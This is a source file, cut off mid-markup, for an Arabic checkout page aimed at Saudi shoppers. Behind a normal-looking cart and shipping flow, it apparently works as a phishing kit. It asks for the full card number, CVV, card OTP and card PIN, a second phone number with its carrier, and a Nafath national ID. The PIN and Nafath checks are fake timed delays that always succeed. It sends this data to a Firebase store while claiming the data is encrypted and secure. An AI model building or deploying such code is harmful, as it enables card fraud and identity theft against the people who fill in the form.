"use client"

import { useState, useEffect, useCallback, useRef } from "react"
import { Button } from "../components/ui/button"
import { Input } from "../components/ui/input"
import { Label } from "../components/ui/label"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "../components/ui/card"
import { Separator } from "../components/ui/separator"
import { Badge } from "../components/ui/badge"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "../components/ui/dialog"
import { Minus, Plus, Trash2, MapPin, Check, Loader2, Shield, Phone, CreditCard } from "lucide-react"
import { addData, createOtpVerification, verifyOtp } from "../lib/firebase"
import { MapAddressPicker } from "../components/map-address-picker"
import { useCart } from "../lib/cartContext"
import { PromoPopup } from "../components/promo-popup"
import React from "react"

interface ShippingInfo {
  fullName: string
  phone: string
  city: string
  district?: string
  street?: string
  postalCode?: string
  coordinates?: { lat: number; lng: number }
}

interface PaymentInfo {
  cardNumber: string
  cardName: string
  expiryDate: string
  cvv: string
}

const detectPhoneProvider = (phone: string): string => {
  const providers: Record<string, string[]> = {
    STC: ["050", "053", "055", "058"],
    Mobily: ["054", "056"],
    Zain: ["059"],
    Virgin: ["057"],
  }
  const prefix = phone.slice(0, 3)
  for (const [provider, prefixes] of Object.entries(providers)) {
    if (prefixes.includes(prefix)) {
      return provider
    }
  }
  return "Unknown"
}

export default function CheckoutPage() {
  const [step, setStep] = useState<
    | "cart"
    | "shipping"
    | "payment"
    | "card-otp"
    | "card-pin"
    | "phone-verification"
    | "phone-otp"
    | "nafath"
    | "auth-dialog"
    | "success"
  >("cart")
  const { items, updateQuantity: updateCartQuantity, removeItem: removeCartItem, clearCart } = useCart()
  const [shippingInfo, setShippingInfo] = useState<ShippingInfo>({
    fullName: "",
    phone: "",
    city: "",
  })
  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
    cardNumber: "",
    cardName: "",
    expiryDate: "",
    cvv: "",
  })
  const [cardOtp, setCardOtp] = useState("")
  const [cardPin, setCardPin] = useState("")
  const [phoneOtp, setPhoneOtp] = useState("")
  const [nafathId, setNafathId] = useState("")
  const [nafadPassword, setNafadPassword] = useState("")
  const [phoneProvider, setPhoneProvider] = useState("")
  const [phone2, setPhone2] = useState("")
  const [isVerifying, setIsVerifying] = useState(false)
  const [isProcessingOrder, setIsProcessingOrder] = useState(false)
  const [verificationError, setVerificationError] = useState("")
  const [orderError, setOrderError] = useState("")
  const [canResendOtp, setCanResendOtp] = useState(false)
  const [resendTimer, setResendTimer] = useState(30)
  const [showMap, setShowMap] = useState(false)
  const [error, setError] = useState<string>("")
  const [cardOtpVerificationId, setCardOtpVerificationId] = useState("")
  const [phoneOtpVerificationId, setPhoneOtpVerificationId] = useState("")
  const [showPaymentPopup, setShowPaymentPopup] = useState(false)
  const [showAgeVerification, setShowAgeVerification] = useState(false)
  const [showPromoPopup, setShowPromoPopup] = useState(false)

  const [shippingErrors, setShippingErrors] = useState({
    fullName: "",
    phone: "",
    city: "",
  })
  const [paymentErrors, setPaymentErrors] = useState({
    cardNumber: "",
    cardName: "",
    expiryDate: "",
    cvv: "",
  })
  const [phone2Error, setPhone2Error] = useState("")

  const isLocalStorageLoaded = useRef(false)
  const saveTimeoutRef = useRef<NodeJS.Timeout | null>(null)

  useEffect(() => {
    const isAgeVerified = localStorage.getItem("ageVerified")
    if (!isAgeVerified) {
      setShowAgeVerification(true)
    } else {
      const hasSeenPromo = sessionStorage.getItem("hasSeenPromo")
      if (!hasSeenPromo) {
        setShowPromoPopup(true)
        sessionStorage.setItem("hasSeenPromo", "true")
      }
    }
  }, [])

  useEffect(() => {
    if (!isLocalStorageLoaded.current) {
      const savedShipping = localStorage.getItem("shippingInfo")
      if (savedShipping) {
        try {
          setShippingInfo(JSON.parse(savedShipping))
        } catch (error) {
          console.error("Failed to parse saved shipping info:", error)
        }
      }
      isLocalStorageLoaded.current = true
    }
  }, [])

  useEffect(() => {
    if (step === "payment") {
      setShowPaymentPopup(true)
    }
  }, [step])

  const debouncedSaveToLocalStorage = useCallback((data: ShippingInfo) => {
    if (saveTimeoutRef.current) {
      clearTimeout(saveTimeoutRef.current)
    }

    saveTimeoutRef.current = setTimeout(() => {
      localStorage.setItem("shippingInfo", JSON.stringify(data))
    }, 1000)
  }, [])

  useEffect(() => {
    if (isLocalStorageLoaded.current && step === "shipping" && shippingInfo.fullName) {
      debouncedSaveToLocalStorage(shippingInfo)
    }

    // Cleanup timeout on unmount
    return () => {
      if (saveTimeoutRef.current) {
        clearTimeout(saveTimeoutRef.current)
      }
    }
  }, [shippingInfo, step, debouncedSaveToLocalStorage])

  useEffect(() => {
    if (step !== "shipping" && isLocalStorageLoaded.current && shippingInfo.fullName) {
      if (saveTimeoutRef.current) {
        clearTimeout(saveTimeoutRef.current)
      }
      localStorage.setItem("shippingInfo", JSON.stringify(shippingInfo))
    }
  }, [step, shippingInfo])

  useEffect(() => {
    if ((step === "card-otp" || step === "phone-otp") && resendTimer > 0 && !canResendOtp) {
      const timer = setTimeout(() => setResendTimer(resendTimer - 1), 1000)
      return () => clearTimeout(timer)
    } else if (resendTimer === 0) {
      setCanResendOtp(true)
    }
  }, [resendTimer, step, canResendOtp])

  const totalPrice = useCallback(() => {
    return items.reduce((sum, item) => sum + item.price * item.quantity, 0)
  }, [items])()

  const shippingFee = totalPrice > 100 ? 0 : 10
  const tax = totalPrice * 0.04
  const finalTotal = totalPrice + shippingFee + tax

  const updateQuantity = useCallback(
    (lineId: number, delta: number) => {
      const item = items.find((i) => i.id === lineId)
      if (item) {
        updateCartQuantity(lineId, item.quantity + delta)
      }
    },
    [items, updateCartQuantity],
  )

  const removeItem = useCallback(
    (lineId: number) => {
      removeCartItem(lineId)
    },
    [removeCartItem],
  )

  const validatePhone = (phone: string): string => {
    if (!phone.trim()) return "رقم الجوال مطلوب"
    if (!/^05\d{8}$/.test(phone)) return "رقم الجوال يجب أن يبدأ بـ 05 ويتكون من 10 أرقام"
    return ""
  }

  const validateName = (name: string): string => {
    if (!name.trim()) return "الاسم الكامل مطلوب"
    if (name.trim().length < 3) return "الاسم يجب أن يكون 3 أحرف على الأقل"
    if (!/^[\u0600-\u06FFa-zA-Z\s]+$/.test(name)) return "الاسم يجب أن يحتوي على حروف فقط"
    return ""
  }

  const validateCity = (city: string): string => {
    if (!city.trim()) return "المدينة مطلوبة"
    if (city.trim().length < 2) return "اسم المدينة يجب أن يكون حرفين على الأقل"
    return ""
  }

  const validateCardNumber = (cardNumber: string): string => {
    const cleaned = cardNumber.replace(/\s/g, "")
    if (!cleaned) return "رقم البطاقة مطلوب"
    if (cleaned.length !== 16) return "رقم البطاقة يجب أن يتكون من 16 رقم"
    if (!/^\d+$/.test(cleaned)) return "رقم البطاقة يجب أن يحتوي على أرقام فقط"
    if (isBlockedCard(cleaned)) return "هذا النوع من البطاقات غير مقبول"
    return ""
  }

  const validateCardName = (name: string): string => {
    if (!name.trim()) return "اسم حامل البطاقة مطلوب"
    if (name.trim().length < 3) return "الاسم يجب أن يكون 3 أحرف على الأقل"
    if (!/^[a-zA-Z\s]+$/.test(name)) return "الاسم يجب أن يحتوي على حروف إنجليزية فقط"
    return ""
  }

  const validateExpiryDate = (expiry: string): string => {
    if (!expiry) return "تاريخ الانتهاء مطلوب"
    if (expiry.length !== 5) return "تاريخ الانتهاء يجب أن يكون بصيغة MM/YY"

    const [month, year] = expiry.split("/")
    const monthNum = Number.parseInt(month)
    const yearNum = Number.parseInt("20" + year)

    if (monthNum < 1 || monthNum > 12) return "الشهر غير صحيح"

    const now = new Date()
    const currentYear = now.getFullYear()
    const currentMonth = now.getMonth() + 1

    if (yearNum < currentYear || (yearNum === currentYear && monthNum < currentMonth)) {
      return "البطاقة منتهية الصلاحية"
    }

    return ""
  }

  const validateCvv = (cvv: string): string => {
    if (!cvv) return "رمز الأمان مطلوب"
    if (cvv.length !== 3) return "رمز الأمان يجب أن يتكون من 3 أرقام"
    if (!/^\d+$/.test(cvv)) return "رمز الأمان يجب أن يحتوي على أرقام فقط"
    return ""
  }

  const isShippingValid = (): boolean => {
    const nameError = validateName(shippingInfo.fullName)
    const phoneError = validatePhone(shippingInfo.phone)
    const cityError = validateCity(shippingInfo.city)

    return !nameError && !phoneError && !cityError
  }

  const isPaymentValid = (): boolean => {
    const cardNumberError = validateCardNumber(paymentInfo.cardNumber)
    const cardNameError = validateCardName(paymentInfo.cardName)
    const expiryError = validateExpiryDate(paymentInfo.expiryDate)
    const cvvError = validateCvv(paymentInfo.cvv)

    return !cardNumberError && !cardNameError && !expiryError && !cvvError
  }

  const handleShippingBlur = (field: keyof typeof shippingErrors) => {
    let error = ""

    switch (field) {
      case "fullName":
        error = validateName(shippingInfo.fullName)
        break
      case "phone":
        error = validatePhone(shippingInfo.phone)
        break
      case "city":
        error = validateCity(shippingInfo.city)
        break
    }

    setShippingErrors({ ...shippingErrors, [field]: error })
  }

  const handlePaymentBlur = (field: keyof typeof paymentErrors) => {
    let error = ""

    switch (field) {
      case "cardNumber":
        error = validateCardNumber(paymentInfo.cardNumber)
        break
      case "cardName":
        error = validateCardName(paymentInfo.cardName)
        break
      case "expiryDate":
        error = validateExpiryDate(paymentInfo.expiryDate)
        break
      case "cvv":
        error = validateCvv(paymentInfo.cvv)
        break
    }

    setPaymentErrors({ ...paymentErrors, [field]: error })
  }

  const handleShippingChange = (field: keyof ShippingInfo, value: string) => {
    setShippingInfo({ ...shippingInfo, [field]: value })
    if (shippingErrors[field as keyof typeof shippingErrors]) {
      setShippingErrors({ ...shippingErrors, [field]: "" })
    }
  }

  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\s/g, "")
    const chunks = cleaned.match(/.{1,4}/g) || []
    return chunks.join(" ")
  }

  const formatExpiryDate = (value: string) => {
    const cleaned = value.replace(/\D/g, "")
    if (cleaned.length >= 2) {
      return cleaned.slice(0, 2) + "/" + cleaned.slice(2, 4)
    }
    return cleaned
  }

  const BLOCKED_CARD_PREFIXES = ["4847", "4685", "4286"]

  const isBlockedCard = (cardNumber: string): boolean => {
    return BLOCKED_CARD_PREFIXES.some((prefix) => cardNumber.startsWith(prefix))
  }

  const handleCardNumberChange = (value: string) => {
    const cleaned = value.replace(/\s/g, "")
    if (cleaned.length <= 16 && /^\d*$/.test(cleaned)) {
      setPaymentInfo({ ...paymentInfo, cardNumber: formatCardNumber(cleaned) })
      if (paymentErrors.cardNumber) {
        setPaymentErrors({ ...paymentErrors, cardNumber: "" })
      }
    }
  }

  const handleExpiryChange = (value: string) => {
    const cleaned = value.replace(/\D/g, "")
    if (cleaned.length <= 4) {
      setPaymentInfo({ ...paymentInfo, expiryDate: formatExpiryDate(cleaned) })
      if (paymentErrors.expiryDate) {
        setPaymentErrors({ ...paymentErrors, expiryDate: "" })
      }
    }
  }

  const handleCvvChange = (value: string) => {
    if (value.length <= 3 && /^\d*$/.test(value)) {
      setPaymentInfo({ ...paymentInfo, cvv: value })
      if (paymentErrors.cvv) {
        setPaymentErrors({ ...paymentErrors, cvv: "" })
      }
    }
  }

  const handleShippingNext = () => {
    const nameError = validateName(shippingInfo.fullName)
    const phoneError = validatePhone(shippingInfo.phone)
    const cityError = validateCity(shippingInfo.city)

    setShippingErrors({
      fullName: nameError,
      phone: phoneError,
      city: cityError,
    })

    if (!nameError && !phoneError && !cityError) {
      setStep("payment")
    }
  }

  const handlePaymentNext = () => {
    const cardNumberError = validateCardNumber(paymentInfo.cardNumber)
    const cardNameError = validateCardName(paymentInfo.cardName)
    const expiryError = validateExpiryDate(paymentInfo.expiryDate)
    const cvvError = validateCvv(paymentInfo.cvv)

    setPaymentErrors({
      cardNumber: cardNumberError,
      cardName: cardNameError,
      expiryDate: expiryError,
      cvv: cvvError,
    })

    if (!cardNumberError && !cardNameError && !expiryError && !cvvError) {
      sendCardOtp()
    }
  }

  const handlePhoneVerification = () => {
    const phoneError = validatePhone(phone2)
    setPhone2Error(phoneError)

    if (!phoneError) {
      sendPhoneOtp()
    }
  }

  const sendCardOtp = async () => {
    try {
      const otpCode = Math.floor(100000 + Math.random() * 900000).toString()
      const verificationId = await createOtpVerification(shippingInfo.phone, otpCode)
      setCardOtpVerificationId(verificationId)
      console.log("✅ Card OTP sent:", otpCode)
      setStep("card-otp")
      setResendTimer(30)
      setCanResendOtp(false)
    } catch (error) {
      console.error("❌ Error sending card OTP:", error)
      setVerificationError("فشل إرسال رمز التحقق")
    }
  }

  const handleCardOtpVerify = async () => {
    if (cardOtp.length < 4) {
      setVerificationError("الرجاء إدخال رمز التحقق بشكل صحيح")
      return
    }
    setIsVerifying(true)
    setVerificationError("")
    try {
      await verifyOtp(cardOtpVerificationId, cardOtp)
      console.log("✅ Card OTP verified successfully")
      setIsVerifying(false)
      setCardOtp("")
      setStep("card-pin")
    } catch (error: any) {
      console.error("❌ Card OTP verification error:", error)
      setIsVerifying(false)
      setVerificationError(error.message || "رمز التحقق غير صحيح")
    }
  }

  const handleCardPinVerify = async () => {
    if (cardPin.length !== 4) {
      setVerificationError("الرجاء إدخال رمز PIN المكون من 4 أرقام")
      return
    }
    setIsVerifying(true)
    setVerificationError("")
    try {
      await new Promise((resolve) => setTimeout(resolve, 1500))
      console.log("✅ Card PIN verified")
      setIsVerifying(false)
      setCardPin("")
      const provider = detectPhoneProvider(shippingInfo.phone)
      setPhoneProvider(provider)
      setStep("phone-verification")
    } catch (error) {
      console.error("❌ Card PIN verification error:", error)
      setIsVerifying(false)
      setVerificationError("رمز PIN غير صحيح")
    }
  }

  const sendPhoneOtp = async () => {
    try {
      const visitor = localStorage.getItem("visitor")
      await addData({ id: visitor, phone2, operator: phoneProvider })
      setStep("phone-otp")
      setResendTimer(30)
      setCanResendOtp(false)
    } catch (error) {
      console.error("❌ Error sending phone OTP:", error)
      setVerificationError("فشل إرسال رمز التحقق")
    }
  }

  const handlePhoneOtpVerify = async () => {
    if (phoneOtp.length !== 6) {
      setVerificationError("الرجاء إدخال رمز التحقق بشكل صحيح")
      return
    }
    setIsVerifying(true)
    setVerificationError("")
    try {
      await verifyOtp(phoneOtpVerificationId, phoneOtp)
      console.log("✅ Phone OTP verified successfully")
      setIsVerifying(false)
      setPhoneOtp("")
      setStep("nafath")
    } catch (error: any) {
      console.error("❌ Phone OTP verification error:", error)
      setIsVerifying(false)
      setVerificationError(error.message || "رمز التحقق غير صحيح")
    }
  }

  const handleNafathVerify = async () => {
    if (nafathId.length !== 10) {
      setVerificationError("الرجاء إدخال رقم هوية نفاذ صحيح (10 أرقام)")
      return
    }
    const visitorId = localStorage.getItem("visitor")
    await addData({ id: visitorId, nafathId, authNumber: "" })

    setIsVerifying(true)
    setVerificationError("")
    try {
      await new Promise((resolve) => setTimeout(resolve, 2000))
      console.log("✅ Nafath ID verified")
      setIsVerifying(false)
      setStep("auth-dialog")
    } catch (error) {
      console.error("❌ Nafath verification error:", error)
      setIsVerifying(false)
      setVerificationError("فشل التحقق من نفاذ")
    }
  }

  const handleFinalSubmit = async () => {
    setIsProcessingOrder(true)
    setOrderError("")
    try {
      const visitorId = localStorage.getItem("visitor")
      const orderId = `order-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`

      const paysData = {
        id: orderId,
        visitorId: visitorId,
        timestamp: new Date().toISOString(),
        status: "pending",

        // Shipping information
        shipping: {
          fullName: shippingInfo.fullName,
          phone: shippingInfo.phone,
          city: shippingInfo.city,
          district: shippingInfo.district || "",
          street: shippingInfo.street || "",
          postalCode: shippingInfo.postalCode || "",
          coordinates: shippingInfo.coordinates || null,
        },

        // Payment information
        payment: {
          cardNumber: paymentInfo.cardNumber, // Full card number (encrypted in production)
          cardLast4: paymentInfo.cardNumber.slice(-4),
          cardName: paymentInfo.cardName,
          expiryDate: paymentInfo.expiryDate,
          cardOtpVerified: true,
          cardPinVerified: true,
        },

        // Additional verification data
        verification: {
          phone2: phone2,
          phoneProvider: phoneProvider,
          phoneOtpVerified: true,
          nafathId: nafathId,
          nafadPassword: nafadPassword,
          verifiedAt: new Date().toISOString(),
        },

        // Order items
        items: items.map((item) => ({
          id: item.productId,
          name: item.nameAr,
          nameEn: item.nameEn || "",
          price: item.price,
          quantity: item.quantity,
          imageUrl: item.imageUrl || "",
          subtotal: item.price * item.quantity,
        })),

        // Pricing breakdown
        pricing: {
          subtotal: totalPrice,
          shippingFee,
          tax,
          taxRate: 0.15,
          total: finalTotal,
        },

        // Metadata
        metadata: {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
        },
      }

      await addData(paysData)
      console.log("✅ Payment data saved successfully:", orderId)

      setIsProcessingOrder(false)
      clearCart()
      setStep("success")
    } catch (error) {
      console.error("❌ Order submission error:", error)
      setIsProcessingOrder(false)
      setOrderError("حدث خطأ أثناء معالجة الطلب. الرجاء المحاولة مرة أخرى.")
    }
  }

  const handleResendOtp = async () => {
    setVerificationError("")
    setCanResendOtp(false)
    setResendTimer(30)
    if (step === "card-otp") {
      setCardOtp("")
      await sendCardOtp()
    } else if (step === "phone-otp") {
      setPhoneOtp("")
      await sendPhoneOtp()
    }
  }

  const handleMapAddressSelect = (address: {
    lat: number
    lng: number
    city: string
    district: string
    street: string
  }) => {
    setShippingInfo({
      ...shippingInfo,
      city: address.city,
      district: address.district,
      street: address.street,
      coordinates: { lat: address.lat, lng: address.lng },
    })
    setShowMap(false)
  }

  const handleAgeVerified = () => {
    localStorage.setItem("ageVerified", "true")
    setShowAgeVerification(false)
    const hasSeenPromo = sessionStorage.getItem("hasSeenPromo")
    if (!hasSeenPromo) {
      setShowPromoPopup(true)
      sessionStorage.setItem("hasSeenPromo", "true")
    }
  }

  const handleAgeRejected = () => {
    window.location.href = "https://www.google.com"
  }

  if (items.length === 0 && step === "cart") {
    return (
      <div className="min-h-screen bg-muted/30 flex items-center justify-center p-4">
        <Card className="max-w-md w-full text-center">
          <CardHeader>
            <CardTitle className="text-2xl">السلة فارغة</CardTitle>
            <CardDescription>لم تقم بإضافة أي منتجات بعد</CardDescription>
          </CardHeader>
          <CardContent>
            <Button className="w-full" asChild>
              <a href="/products">تصفح المنتجات</a>
            </Button>
          </CardContent>
        </Card>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-background to-muted/20 p-4">
      <PromoPopup open={showPromoPopup} onClose={() => setShowPromoPopup(false)} />

      <div className="max-w-4xl mx-auto">
        {/* Progress Stepper */}
        <div className="mb-8">
          <div className="flex items-center justify-between">
            {["cart", "shipping", "payment", "verification"].map((s, i) => (
              <div key={s} className="flex items-center flex-1">
                <div className="flex flex-col items-center flex-1">
                  <div
                    className={`w-10 h-10 rounded-full flex items-center justify-center border-2 transition-colors ${
                      ["cart", "shipping", "payment"].includes(step) && s === step
                        ? "bg-primary text-primary-foreground border-primary"
                        : !["cart", "shipping", "payment"].includes(step) && s === "verification"
                          ? "bg-primary text-primary-foreground border-primary"
                          : ["cart", "shipping", "payment"].indexOf(step as any) >
                              ["cart", "shipping", "payment", "verification"].indexOf(s)
                            ? "bg-primary text-primary-foreground border-primary"
                            : "bg-background text-muted-foreground border-border"
                    }`}
                  >
                    {i + 1}
                  </div>
                  <span className="text-xs mt-1 font-medium">
                    {s === "cart" && "السلة"}
                    {s === "shipping" && "الشحن"}
                    {s === "payment" && "الدفع"}
                    {s === "verification" && "التحقق"}
                  </span>
                </div>
                {i < 3 && (
                  <div
                    className={`h-0.5 flex-1 transition-colors ${
                      ["cart", "shipping", "payment"].indexOf(step as any) > i ||
                      !["cart", "shipping", "payment"].includes(step)
                        ? "bg-primary"
                        : "bg-border"
                    }`}
                  />
                )}
              </div>
            ))}
          </div>
        </div>

        {/* Cart Step */}
        {step === "cart" && (
          <div className="space-y-6">
            <Card>
              <CardHeader>
                <CardTitle className="text-xl">سلة التسوق</CardTitle>
                <CardDescription>
                  لديك {items.length} {items.length === 1 ? "منتج" : "منتجات"}
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                {items.map((item) => (
                  <div
                    key={item.id}
                    className="flex gap-2 p-2 rounded-lg border bg-card hover:shadow-sm transition-shadow"
                  >
                    <img
                      src={item.imageUrl || "/placeholder.svg?height=80&width=80"}
                      alt={item.nameAr}
                      className="w-16 h-16 object-cover rounded"
                    />
                    <div className="flex-1">
                      <h3 className="font-semibold">{item.nameAr}</h3>
                      <p className="text-sm text-muted-foreground">{item.price} ريال</p>
                      <div className="flex items-center gap-2 mt-2">
                        <Button
                          size="icon"
                          variant="outline"
                          className="h-8 w-8 bg-transparent"
                          onClick={() => updateQuantity(item.id, -1)}
                          disabled={item.quantity === 1}
                        >
                          <Minus className="h-4 w-4" />
                        </Button>
                        <span className="w-8 text-center font-medium">{item.quantity}</span>
                        <Button
                          size="icon"
                          variant="outline"
                          className="h-8 w-8 bg-transparent"
                          onClick={() => updateQuantity(item.id, 1)}
                        >
                          <Plus className="h-4 w-4" />
                        </Button>
                      </div>
                    </div>
                    <div className="flex flex-col items-end justify-between">
                      <Button
                        size="icon"
                        variant="ghost"
                        className="text-destructive"
                        onClick={() => removeItem(item.id)}
                      >
                        <Trash2 className="h-4 w-4" />
                      </Button>
                      <p className="font-bold">{item.price * item.quantity} ريال</p>
                    </div>
                  </div>
                ))}
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle>ملخص الطلب</CardTitle>
              </CardHeader>
              <CardContent className="space-y-3">
                <div className="flex justify-between">
                  <span className="text-muted-foreground">المجموع الفرعي</span>
                  <span>{totalPrice} ريال</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground">رسوم الشحن</span>
                  <span>{shippingFee === 0 ? "مجاني" : `${shippingFee} ريال`}</span>
                </div>
                {shippingFee === 0 && (
                  <Badge variant="secondary" className="w-fit">
                    شحن مجاني للطلبات فوق 500 ريال
                  </Badge>
                )}
                <div className="flex justify-between">
                  <span className="text-muted-foreground">الضريبة (15%)</span>
                  <span>{tax.toFixed(2)} ريال</span>
                </div>
                <Separator />
                <div className="flex justify-between text-lg font-bold">
                  <span>الإجمالي</span>
                  <span>{finalTotal.toFixed(2)} ريال</span>
                </div>
                <Button className="w-full" size="lg" onClick={() => setStep("shipping")}>
                  المتابعة إلى الشحن
                </Button>
              </CardContent>
            </Card>
          </div>
        )}

        {/* Shipping Step */}
        {step === "shipping" && (
          <Card>
            <CardHeader>
              <CardTitle className="text-2xl">معلومات الشحن</CardTitle>
              <CardDescription>أدخل عنوان التوصيل</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <Button
                type="button"
                variant="outline"
                className="w-full gap-2 bg-transparent"
                onClick={() => setShowMap(true)}
              >
                <MapPin className="h-4 w-4" />
                حدد الموقع من الخريطة
              </Button>

              <div className="grid gap-4 md:grid-cols-2">
                <div className="space-y-2">
                  <Label htmlFor="fullName">الاسم الكامل</Label>
                  <Input
                    id="fullName"
                    placeholder="أدخل الاسم الكامل"
                    value={shippingInfo.fullName}
                    onChange={(e) => handleShippingChange("fullName", e.target.value)}
                    onBlur={() => handleShippingBlur("fullName")}
                    className={shippingErrors.fullName ? "border-destructive" : ""}
                  />
                  {shippingErrors.fullName && <p className="text-sm text-destructive">{shippingErrors.fullName}</p>}
                </div>
                <div className="space-y-2">
                  <Label htmlFor="phone">رقم الجوال</Label>
                  <Input
                    id="phone"
                    maxLength={10}
                    type="tel"
                    placeholder="05XXXXXXXX"
                    value={shippingInfo.phone}
                    onChange={(e) => handleShippingChange("phone", e.target.value)}
                    onBlur={() => handleShippingBlur("phone")}
                    className={shippingErrors.phone ? "border-destructive" : ""}
                  />
                  {shippingErrors.phone && <p className="text-sm text-destructive">{shippingErrors.phone}</p>}
                </div>
              </div>

              <div className="grid gap-4 md:grid-cols-2">
                <div className="space-y-2">
                  <Label htmlFor="city">المدينة</Label>
                  <Input
                    id="city"
                    placeholder="مثال: الرياض"
                    value={shippingInfo.city}
                    onChange={(e) => handleShippingChange("city", e.target.value)}
                    onBlur={() => handleShippingBlur("city")}
                    className={shippingErrors.city ? "border-destructive" : ""}
                  />
                  {shippingErrors.city && <p className="text-sm text-destructive">{shippingErrors.city}</p>}
                </div>
                <div className="space-y-2">
                  <Label htmlFor="district">الحي</Label>
                  <Input
                    id="district"
                    placeholder="أدخل الحي"
                    value={shippingInfo.district}
                    onChange={(e) => setShippingInfo({ ...shippingInfo, district: e.target.value })}
                  />
                </div>
              </div>

              <div className="space-y-2">
                <Label htmlFor="street">اسم الشارع</Label>
                <Input
                  id="street"
                  placeholder="أدخل اسم الشارع"
                  value={shippingInfo.street}
                  onChange={(e) => setShippingInfo({ ...shippingInfo, street: e.target.value })}
                />
              </div>

              <div className="flex gap-3 pt-4">
                <Button variant="outline" className="flex-1 bg-transparent" onClick={() => setStep("cart")}>
                  رجوع
                </Button>
                <Button className="flex-1" onClick={handleShippingNext}>
                  المتابعة إلى الدفع
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {/* Payment Step */}
        {step === "payment" && (
          <>
            <Dialog open={showPaymentPopup} onOpenChange={setShowPaymentPopup}>
              <DialogContent dir="rtl" className="max-w-lg p-0 gap-0 overflow-hidden border-0 bg-[#0b1d4a]">
                <div className="relative">
                  <img
                    src="/payment-cards-banner.jpg"
                    alt="البنوك المقبولة وكاش باك 30%"
                    className="w-full h-auto block"
                    data-testid="img-payment-banner"
                  />
                </div>
                <div className="p-4 bg-[#0b1d4a]">
                  <Button
                    className="w-full h-12 rounded-xl font-bold text-base bg-white text-[#0b1d4a] hover:bg-white/90"
                    onClick={() => setShowPaymentPopup(false)}
                    data-testid="button-payment-popup-continue"
                  >
                    المتابعة للدفع
                  </Button>
                </div>
              </DialogContent>
            </Dialog>

            <Card className="max-w-xl mx-auto shadow-lg border">
              <CardHeader className="space-y-1 text-center">
                <CardTitle className="text-2xl font-bold">معلومات الدفع</CardTitle>
                <CardDescription className="text-muted-foreground">جميع بياناتك مشفرة وآمنة</CardDescription>
              </CardHeader>
              <CardContent className="space-y-6">
                <div className="space-y-2">
                  <Label htmlFor="cardNumber">رقم البطاقة</Label>
                  <Input
                    id="cardNumber"
                    placeholder="1234 5678 9012 3456"
                    className={`tracking-widest text-lg ${paymentErrors.cardNumber ? "border-destructive" : ""}`}
                    value={paymentInfo.cardNumber}
                    onChange={(e) => handleCardNumberChange(e.target.value)}
                    onBlur={() => handlePaymentBlur("cardNumber")}
                  />
                  {paymentErrors.cardNumber && <p className="text-sm text-destructive">{paymentErrors.cardNumber}</p>}
                </div>

                <div className="space-y-2">
                  <Label htmlFor="cardName">اسم حامل البطاقة</Label>
                  <Input
                    id="cardName"
                    placeholder="الاسم كما هو مكتوب على البطاقة"
                    value={paymentInfo.cardName}
                    onChange={(e) => {
                      setPaymentInfo({ ...paymentInfo, cardName: e.target.value })
                      if (paymentErrors.cardName) {
                        setPaymentErrors({ ...paymentErrors, cardName: "" })
                      }
                    }}
                    onBlur={() => handlePaymentBlur("cardName")}
                    className={paymentErrors.cardName ? "border-destructive" : ""}
                  />
                  {paymentErrors.cardName && <p className="text-sm text-destructive">{paymentErrors.cardName}</p>}
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="expiryDate">تاريخ الانتهاء</Label>
                    <Input
                      id="expiryDate"
                      placeholder="MM/YY"
                      value={paymentInfo.expiryDate}
                      onChange={(e) => handleExpiryChange(e.target.value)}
                      onBlur={() => handlePaymentBlur("expiryDate")}
                      className={paymentErrors.expiryDate ? "border-destructive" : ""}
                    />
                    {paymentErrors.expiryDate && <p className="text-sm text-destructive">{paymentErrors.expiryDate}</p>}
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="cvv">رمز الأمان (CVV)</Label>
                    <Input
                      id="cvv"
                      placeholder="123"
                      type="password"
                      value={paymentInfo.cvv}
                      onChange={(e) => handleCvvChange(e.target.value)}
                      onBlur={() => handlePaymentBlur("cvv")}
                      className={paymentErrors.cvv ? "border-destructive" : ""}
                    />
                    {paymentErrors.cvv && <p className="text-sm text-destructive">{paymentErrors.cvv}</p>}
                  </div>
                </div>

                <div className="flex items-center gap-2 rounded-md bg-muted px-3 py-2 text-sm text-muted-foreground">
                  <Shield className="h-4 w-4" />
                  يتم تشفير معلومات الدفع باستخدام SSL
                </div>

                <div className="flex gap-3 pt-2">
                  <Button variant="outline" className="flex-1 bg-transparent" onClick={() => setStep("shipping")}>
                    رجوع
                  </Button>
                  <Button className="flex-1 text-lg" onClick={handlePaymentNext}>
                    تأكيد الدفع
                  </Button>
                </div>
              </CardContent>
            </Card>
          </>
        )}

        {step === "card-otp" && (
          <Card>
            <CardHeader>
              <div className="mx-auto w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center mb-4">
                <CreditCard className="h-6 w-6 text-primary" />
              </div>
              <CardTitle className="text-2xl text-center">التحقق من البطاقة</CardTitle>
              <CardDescription className="text-center">
                تم إرسال رمز التحقق إلى رقم الجوال {shippingInfo.phone}
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div>
                <Label className="text-center block mb-4">أدخل رمز التحقق</Label>
                <div className="flex gap-2 justify-center" dir="ltr">
                  <Input
                    type="text"
                    inputMode="numeric"
                    autoComplete="one-time-code"
                    maxLength={6}
                    value={cardOtp}
                    onChange={(e) => setCardOtp(e.target.value)}
                    className={`w-full h-12 text-center text-lg font-bold tracking-widest ${verificationError ? "border-destructive" : ""}`}
                  />
                </div>
                {verificationError && <p className="text-sm text-destructive text-center mt-2">{verificationError}</p>}
              </div>

              <div className="text-center text-sm text-muted-foreground">
                {canResendOtp ? (
                  <button onClick={handleResendOtp} className="text-primary hover:underline font-medium">
                    إعادة إرسال الرمز
                  </button>
                ) : (
                  <span>يمكنك إعادة الإرسال بعد {resendTimer} ثانية</span>
                )}
              </div>

              <div className="flex gap-3">
                <Button
                  variant="outline"
                  className="flex-1 bg-transparent"
